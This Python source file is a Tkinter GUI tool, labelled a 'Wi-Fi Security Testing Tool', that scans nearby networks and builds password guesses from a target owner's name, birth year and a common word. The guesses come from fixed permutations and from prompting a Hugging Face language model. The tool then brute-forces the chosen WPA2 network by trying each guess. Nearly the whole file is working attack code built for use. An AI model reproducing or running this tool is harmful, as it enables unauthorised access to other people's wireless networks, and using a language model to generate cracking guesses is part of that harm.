import os
import time
import requests
import pywifi
from pywifi import const
import tkinter as tk
from tkinter import filedialog, messagebox
from dotenv import load_dotenv

# Load API Key from .env file
load_dotenv("key.env")
HUGGINGFACE_API_KEY = os.getenv("HUGGINGFACE_API_KEY")

# Using a better instruction-following model
HUGGINGFACE_API_URL = "https://api-inference.huggingface.co/models/google/flan-t5-large"


if not HUGGINGFACE_API_KEY:
    raise ValueError("API Key missing! Please set HUGGINGFACE_API_KEY in the key.env file.")

# Function to scan available Wi-Fi networks
def scan_wifi_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    scan_results = iface.scan_results()
    networks = [network.ssid for network in scan_results if network.ssid]
    return list(set(networks))

# Function to select Wi-Fi network
def select_wifi_network():
    networks = scan_wifi_networks()
    if not networks:
        messagebox.showinfo("No Networks Found", "No available Wi-Fi networks found.")
        return
    
    network_window = tk.Toplevel(root)
    network_window.title("Select Wi-Fi Network")
    
    def set_selected_network(ssid):
        wifi_name_entry.delete(0, tk.END)
        wifi_name_entry.insert(0, ssid)
        network_window.destroy()
    
    for network in networks:
        tk.Button(network_window, text=network, command=lambda ssid=network: set_selected_network(ssid)).pack(pady=2)

# Function to connect to Wi-Fi
def connect_to_wifi(wifi_name, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(5)
        
        return iface.status() == const.IFACE_CONNECTED
    return False

# Function to manually generate password permutations
def generate_manual_permutations(owner_name, birth_year, common_word):
    return [
        f"{owner_name}{common_word}{birth_year}",
        f"{common_word}{owner_name}{birth_year}",
        f"{birth_year}{owner_name}{common_word}",
        f"{owner_name}{birth_year}{common_word}",
        f"{common_word}{birth_year}{owner_name}",
        f"{birth_year}{common_word}{owner_name}",
        f"{owner_name}_{common_word}_{birth_year}",
        f"{owner_name.capitalize()}{common_word.capitalize()}{birth_year}!",
        f"{common_word}{birth_year}123",
        f"{owner_name.lower()}{birth_year}$$",
        f"{owner_name.upper()}{common_word}!{birth_year}",
        f"{common_word}#{birth_year}",
        f"{owner_name[:3]}_{birth_year}_{common_word}",
        f"{common_word}{birth_year}!",
        f"{owner_name}{common_word}2024",
        f"{owner_name}{common_word}{birth_year}!"
    ]

# Function to generate password permutations using Hugging Face API
def generate_passwords():
    owner_name = owner_name_entry.get().strip()
    birth_year = birth_year_entry.get().strip()
    common_word = common_word_entry.get().strip()

    if not owner_name or not birth_year or not common_word:
        return ["Error: Missing Input Fields"]

    prompt = (f"Generate a list of 10 strong password variations using these words: {owner_name}, {birth_year}, {common_word}. "
              f"Include common patterns, numbers, special characters, and different capitalizations. "
              f"Return each password on a new line.")

    headers = {
        "Authorization": f"Bearer {HUGGINGFACE_API_KEY}",
        "Content-Type": "application/json"
    }

    payload = {"inputs": prompt}

    try:
        response = requests.post(HUGGINGFACE_API_URL, json=payload, headers=headers)
        response_json = response.json()

        print("DEBUG: Full API Response:", response_json)

        ai_generated_passwords = []
        if isinstance(response_json, list) and len(response_json) > 0 and "generated_text" in response_json[0]:
            generated_text = response_json[0]["generated_text"]
            ai_generated_passwords = [line.strip() for line in generated_text.split("\n") if line.strip()]
        
        # Generate manual permutations
        manual_passwords = generate_manual_permutations(owner_name, birth_year, common_word)

        # Combine both lists
        all_passwords = list(set(ai_generated_passwords + manual_passwords))

        return all_passwords
    except Exception as e:
        return [f"Error: {str(e)}"]

# Function to save passwords to a file
def save_passwords_to_file(passwords, filename="generated_passwords.txt"):
    with open(filename, "w") as file:
        for password in passwords:
            file.write(password + "\n")
    return filename

# Function to attempt a brute-force attack
def brute_force_attack(wifi_name, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            if connect_to_wifi(wifi_name, password):
                return password
    return None

# Function to start the attack
def start_attack():
    wifi_name = wifi_name_entry.get().strip()
    if not wifi_name:
        messagebox.showerror("Error", "Please enter the Wi-Fi network name")
        return
    
    passwords = generate_passwords()
    
    if passwords[0].startswith("Error:"):
        messagebox.showerror("Error", passwords[0])
        return
    
    password_file = save_passwords_to_file(passwords)
    password = brute_force_attack(wifi_name, password_file)
    
    if password:
        messagebox.showinfo("Success", f"Password found: {password}")
    else:
        messagebox.showinfo("Failed", "Password not found in the file.")

# Function to browse for an existing password file
def browse_file():
    filename = filedialog.askopenfilename(title="Select Password File", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
    password_file_entry.delete(0, tk.END)
    password_file_entry.insert(0, filename)

# Tkinter GUI Setup
root = tk.Tk()
root.title("Wi-Fi Security Testing Tool")

# Wi-Fi Name Entry
tk.Label(root, text="Wi-Fi Network Name:").grid(row=0, column=0, padx=10, pady=10)
wifi_name_entry = tk.Entry(root, width=30)
wifi_name_entry.grid(row=0, column=1, padx=10, pady=10)

# Browse Networks Button
browse_networks_button = tk.Button(root, text="Browse Networks", command=select_wifi_network)
browse_networks_button.grid(row=0, column=2, padx=10, pady=10)

# Owner Name Entry
tk.Label(root, text="Owner's Name:").grid(row=1, column=0, padx=10, pady=10)
owner_name_entry = tk.Entry(root, width=30)
owner_name_entry.grid(row=1, column=1, padx=10, pady=10)

# Birth Year Entry
tk.Label(root, text="Birth Year:").grid(row=2, column=0, padx=10, pady=10)
birth_year_entry = tk.Entry(root, width=30)
birth_year_entry.grid(row=2, column=1, padx=10, pady=10)

# Common Word Entry
tk.Label(root, text="Common Word:").grid(row=3, column=0, padx=10, pady=10)
common_word_entry = tk.Entry(root, width=30)
common_word_entry.grid(row=3, column=1, padx=10, pady=10)

# Start Button
start_button = tk.Button(root, text="Start Security Test", command=start_attack, bg="red", fg="white")
start_button.grid(row=4, column=1, padx=10, pady=20)

root.mainloop()
